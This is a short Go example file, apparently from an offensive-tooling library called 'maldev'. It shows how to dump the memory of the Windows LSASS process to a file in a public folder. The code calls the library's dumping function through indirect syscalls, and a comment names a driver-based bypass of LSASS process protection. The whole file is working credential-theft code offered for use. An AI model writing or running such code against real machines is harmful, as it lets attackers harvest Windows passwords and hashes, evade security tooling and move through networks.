//go:build windows

package lsassdump_test

import (
	"fmt"

	"github.com/oioio-space/maldev/credentials/lsassdump"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// DumpToFile produces a Windows minidump of LSASS at the given path.
// Uses NtGetNextProcess + in-process MINIDUMP. Requires admin and
// LSASS not protected (PPL bypass via kernel/driver/rtcore64 if PPL).
func ExampleDumpToFile() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	if _, err := lsassdump.DumpToFile(`C:\Users\Public\lsass.dmp`, caller); err != nil {
		fmt.Println("dump:", err)
	}
}
